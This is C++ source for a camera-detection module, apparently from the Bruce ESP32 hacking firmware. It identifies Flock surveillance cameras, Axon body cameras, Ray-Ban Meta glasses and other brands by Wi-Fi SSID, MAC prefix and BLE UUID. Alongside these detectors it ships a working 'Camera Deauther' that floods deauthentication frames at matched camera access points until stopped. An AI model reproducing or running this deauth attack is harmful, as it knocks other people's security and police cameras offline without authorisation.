#include "cam_detector.h"
#include "ble_common.h"
#include "camera_brands.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "esp_wifi.h"
#include "modules/wifi/wifi_atks.h"
#include <WiFi.h>
#include <functional>
#include <globals.h>
#include <vector>

// Defined in modules/wifi/wifi_atks.cpp (not exported in the header).
bool wifi_atk_setWifi();
bool wifi_atk_unsetWifi();

// Detection fingerprints ported from nyanBOX (MIT, (c) 2025 jbohack).
// MAC/OUI prefixes are stored lowercase so they can be compared directly
// against NimBLE/WiFi addresses after lowercasing.

// ---- Flock Safety surveillance cameras --------------------------------------
static const char *const flock_ssid_patterns[] = {
    "flock", "fs ext battery", "penguin", "pigvision"
};
static const char *const flock_mac_prefixes[] = {
    // FS Ext Battery devices
    "58:8e:81", "cc:cc:cc", "ec:1b:bd", "90:35:ea", "04:0d:84",
    "f0:82:c0", "1c:34:f1", "38:5b:44", "94:34:69", "b4:e3:f9",
    // Flock Wi-Fi devices
    "70:c9:4e", "3c:91:80", "d8:f3:bc", "80:30:49", "14:5a:fc",
    "74:4c:a1", "08:3a:88", "9c:2f:9d", "94:08:53", "e4:aa:ea"
};

// ---- Axon (police body cameras) ---------------------------------------------
static const char *const axon_mac_prefixes[] = {"00:25:df"};

// ---- Ray-Ban Meta camera glasses --------------------------------------------
// Identified by the BLE 16-bit service UUID 0xFD5F.
static const char *const rayban_service_uuid = "fd5f";

struct CamDevice {
    String name;
    String address;
    int rssi;
    String method;
    String brand;
};

static String lc(const String &s) {
    String out = s;
    out.toLowerCase();
    return out;
}

template <size_t N>
static bool ouiMatch(const String &macLc, const char *const (&prefixes)[N]) {
    for (size_t i = 0; i < N; i++) {
        if (macLc.startsWith(prefixes[i])) return true;
    }
    return false;
}

template <size_t N>
static bool ssidPatternMatch(const String &ssidLc, const char *const (&patterns)[N]) {
    if (ssidLc.isEmpty()) return false;
    for (size_t i = 0; i < N; i++) {
        if (ssidLc.indexOf(patterns[i]) >= 0) return true;
    }
    return false;
}

static bool deviceHasServiceUUID(const NimBLEAdvertisedDevice *device, const String &needleLc) {
    if (!device->haveServiceUUID()) return false;
    for (size_t i = 0; i < device->getServiceUUIDCount(); i++) {
        if (lc(String(device->getServiceUUID(i).toString().c_str())).indexOf(needleLc) >= 0) return true;
    }
    return false;
}

static void cam_info(const CamDevice &dev) {
    drawMainBorder();
    tft.setTextColor(bruceConfig.priColor);
    tft.drawCentreString("-=Camera Device=-", tftWidth / 2, 28, SMOOTH_FONT);
    tft.drawString((dev.brand.isEmpty() ? String("Name: ") : "Brand: " + dev.brand + " ") + dev.name, 10, 48);
    tft.drawString("MAC: " + dev.address, 10, 66);
    tft.drawString("Method: " + dev.method, 10, 84);
    tft.drawString("RSSI: " + String(dev.rssi) + " dBm", 10, 102);
    tft.drawCentreString("Press " + String(BTN_ALIAS) + " to exit", tftWidth / 2, tftHeight - 20, 1);

    delay(300);
    while (!check(SelPress) && !check(EscPress)) yield();
}

// Present the collected matches in the standard Bruce list UI.
static void showResults(const String &title, std::vector<CamDevice> &devices) {
    if (devices.empty()) {
        displayTextLine("No " + title + " found");
        delay(1500);
        return;
    }

    options = {};
    for (auto &dev : devices) {
        CamDevice d = dev; // capture by value
        String label = (d.brand.isEmpty() ? d.name : d.brand) + " (" + String(d.rssi) + ")";
        options.emplace_back(label.c_str(), [d]() { cam_info(d); });
    }
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, title.c_str());
    options.clear();
}

// WiFi-side fingerprinting: SSID substrings + BSSID OUI. Used by Flock.
static void scanWiFiFlock(std::vector<CamDevice> &out) {
    displayTextLine("Scanning WiFi..");
    int nets = WiFi.scanNetworks(false, true);
    for (int i = 0; i < nets; i++) {
        String ssid = WiFi.SSID(i);
        String mac = WiFi.BSSIDstr(i);
        bool bySsid = ssidPatternMatch(lc(ssid), flock_ssid_patterns);
        bool byMac = ouiMatch(lc(mac), flock_mac_prefixes);
        if (!bySsid && !byMac) continue;
        out.push_back({ssid.isEmpty() ? String("<hidden>") : ssid, mac, (int)WiFi.RSSI(i),
                       bySsid ? String("WiFi SSID") : String("WiFi MAC")});
    }
    WiFi.scanDelete();
}

// BLE-side fingerprinting. matcher() returns the detection-method string for a
// matching advertisement, or an empty string to skip it.
static void scanBleMatching(
    std::vector<CamDevice> &out, std::function<String(const NimBLEAdvertisedDevice *)> matcher
) {
    displayTextLine("Scanning BLE..");
    ble_scan_setup();
    BLEScanResults foundDevices = pBLEScan->getResults(scanTime * 1000, false);
    for (int i = 0; i < foundDevices.getCount(); i++) {
        const NimBLEAdvertisedDevice *device = foundDevices.getDevice(i);
        String method = matcher(device);
        if (method.isEmpty()) continue;
        String name = String(device->getName().c_str());
        if (name.isEmpty()) name = "<no name>";
        out.push_back({name, String(device->getAddress().toString().c_str()), device->getRSSI(), method});
    }
    pBLEScan->clearResults();
    stopBLEStack();
}

static void flockDetector() {
    std::vector<CamDevice> devices;
    scanWiFiFlock(devices);
    scanBleMatching(devices, [](const NimBLEAdvertisedDevice *device) -> String {
        String mac = lc(String(device->getAddress().toString().c_str()));
        String name = lc(String(device->getName().c_str()));
        if (ssidPatternMatch(name, flock_ssid_patterns)) return "BLE Name";
        if (ouiMatch(mac, flock_mac_prefixes)) return "BLE MAC";
        return "";
    });
    showResults("Flock", devices);
}

static void axonDetector() {
    std::vector<CamDevice> devices;
    scanBleMatching(devices, [](const NimBLEAdvertisedDevice *device) -> String {
        String mac = lc(String(device->getAddress().toString().c_str()));
        return ouiMatch(mac, axon_mac_prefixes) ? "BLE MAC" : "";
    });
    showResults("Axon", devices);
}

static void raybanDetector() {
    std::vector<CamDevice> devices;
    String needle = rayban_service_uuid;
    scanBleMatching(devices, [needle](const NimBLEAdvertisedDevice *device) -> String {
        return deviceHasServiceUUID(device, needle) ? "BLE UUID" : "";
    });
    showResults("RayBan", devices);
}

// ---------------------------------------------------------------------------
// Generic multi-brand camera detector (WiFi APs + BLE) using camera_brands DB.
// ---------------------------------------------------------------------------
static void cameraScan() {
    std::vector<CamDevice> devices;

    // WiFi APs
    displayTextLine("Scanning WiFi..");
    int nets = WiFi.scanNetworks(false, true);
    for (int i = 0; i < nets; i++) {
        String ssid = WiFi.SSID(i);
        String mac = WiFi.BSSIDstr(i);
        const char *method = nullptr;
        const char *brand = identifyCamera(lc(mac), lc(ssid), &method);
        if (!brand) continue;
        devices.push_back({ssid.isEmpty() ? String("<hidden>") : ssid, mac, (int)WiFi.RSSI(i),
                           String("WiFi ") + method, String(brand)});
    }
    WiFi.scanDelete();

    // BLE advertisers. scanBleMatching only records the method string, so we
    // pack the brand into it as "BLE <method>|<brand>" and unpack it below.
    scanBleMatching(devices, [](const NimBLEAdvertisedDevice *device) -> String {
        String mac = lc(String(device->getAddress().toString().c_str()));
        String name = lc(String(device->getName().c_str()));
        const char *method = nullptr;
        const char *brand = identifyCamera(mac, name, &method);
        if (!brand) return "";
        return String("BLE ") + method + "|" + brand;
    });
    for (auto &d : devices) {
        int sep = d.method.indexOf('|');
        if (sep >= 0) {
            d.brand = d.method.substring(sep + 1);
            d.method = d.method.substring(0, sep);
        }
    }

    showResults("Cameras", devices);
}

// ---------------------------------------------------------------------------
// Camera Deauther: scan, keep only camera APs, then flood deauth them.
// Reuses Bruce's wifi_atks raw-frame primitives.
// ---------------------------------------------------------------------------
static void cameraDeauther() {
    if (!wifi_atk_setWifi()) return;

    displayTextLine("Scanning WiFi..");
    int nets = WiFi.scanNetworks(false, true);

    std::vector<wifi_ap_record_t> targets;
    for (int i = 0; i < nets; i++) {
        String ssid = WiFi.SSID(i);
        String mac = WiFi.BSSIDstr(i);
        if (!identifyCamera(lc(mac), lc(ssid), nullptr)) continue;

        wifi_ap_record_t rec;
        memset(&rec, 0, sizeof(rec));
        memcpy(rec.bssid, WiFi.BSSID(i), 6);
        rec.primary = static_cast<uint8_t>(WiFi.channel(i));
        strncpy((char *)rec.ssid, ssid.c_str(), sizeof(rec.ssid) - 1);
        targets.push_back(rec);
    }
    WiFi.scanDelete();

    if (targets.empty()) {
        displayTextLine("No camera APs found");
        delay(1500);
        wifi_atk_unsetWifi();
        return;
    }

    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    uint32_t lastTime = millis();
    uint32_t rescanTime = millis();
    uint16_t count = 0;
    drawMainBorderWithTitle("Cam Deauther");
    tft.setCursor(10, 60);
    tft.println(String(targets.size()) + " camera AP(s)");

    while (!check(EscPress)) {
        for (const auto &rec : targets) {
            wsl_bypasser_send_raw_frame(&rec, rec.primary, _default_target);
            for (int i = 0; i < 50; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                count += 3;
                if (EscPress) break;
            }
            if (EscPress) break;
        }
        if (millis() - lastTime > 2000) {
            drawMainBorderWithTitle("Cam Deauther");
            tft.setCursor(10, 60);
            tft.println(String(targets.size()) + " camera AP(s)");
            tft.setCursor(10, tftHeight - 25);
            tft.println("Frames: " + String(count / 2) + "/s   ");
            count = 0;
            lastTime = millis();
        }
        if (millis() - rescanTime > 60000) break; // bail out to allow a fresh scan
    }

    wifi_atk_unsetWifi();
    returnToMenu = true;
}

void camDetectorMenu() {
    options = {
        {"Camera Scan",     cameraScan                },
        {"Camera Deauther", cameraDeauther            },
        {"Flock Detector",  flockDetector             },
        {"Axon Detector",   axonDetector              },
        {"RayBan Detector", raybanDetector            },
    };
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "Cam Detector");
    options.clear();
}
